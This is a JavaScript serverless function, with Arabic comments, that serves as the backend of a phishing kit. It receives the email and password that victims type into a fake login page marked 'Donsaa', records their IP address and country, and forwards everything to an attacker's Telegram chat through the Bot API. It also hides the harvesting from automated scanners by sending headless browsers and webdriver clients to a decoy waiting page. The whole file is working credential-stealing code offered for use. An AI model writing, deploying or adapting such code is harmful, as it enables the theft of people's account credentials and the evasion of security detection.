const fetch = require('node-fetch');

// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)

const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    const ip = getClientIp(event.headers); 
    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
    
    // ----------------------------------------------------------------
    // 1. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
    // ----------------------------------------------------------------
    
    const bodyParams = new URLSearchParams(event.body);
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    const fingerprintJSON = bodyParams.get('security_fingerprint'); 

    let fpData = null;
    let securityStatus = "✅ CLEAN";
    let isBlocked = false;

    try {
        fpData = JSON.parse(fingerprintJSON);
        
        if (fpData.isHuman === false || fpData.webdriver === "Yes" || fpData.headless === "Yes") {
            securityStatus = "❌ BLOCKED - Bot/No Interaction";
            isBlocked = true;
        }

    } catch (e) {
        securityStatus = "❌ BLOCKED - Invalid FP Data";
        isBlocked = true; 
    }

    // ----------------------------------------------------------------
    // 2. تطبيق الحظر الصارم (Bot Block)
    // ----------------------------------------------------------------
    if (isBlocked) {
        console.log(`[BLOCKED BOT] Bot detected: ${securityStatus} from IP: ${ip}, Country: ${countryCode}`);
        
        return {
            statusCode: 303,
            headers: {
                Location: '/waiting.html', 
            },
        };
    }

    // ----------------------------------------------------------------
    // 3. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
    // ----------------------------------------------------------------
    
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);
    const safe_country = escapeMarkdownV2(countryCode);

    // ********** تم حذف fpDetails: **********
    
    // تشكيل الرسالة (إضافة البلد وتنسيق الرسالة)
    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
    message_text += `*STATUS: ${securityStatus}*\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\`\n`;
    message_text += `Country: \`${safe_country}\`\n`; // <--- تم إضافة البلد
    
    // ********** تم حذف قسم *FP Details:* **********

    // ----------------------------------------------------------------
    // 4. إرسال البيانات إلى Telegram 
    // ----------------------------------------------------------------
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message_text,
            parse_mode: 'MarkdownV2',
        };
        try {
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    } else {
         console.error("Telegram API credentials are NOT set up for sending.");
    }
    
    // التحويل إلى صفحة الانتظار
    return {
        statusCode: 303,
        headers: {
            Location: '/waiting.html',
        },
    };
};
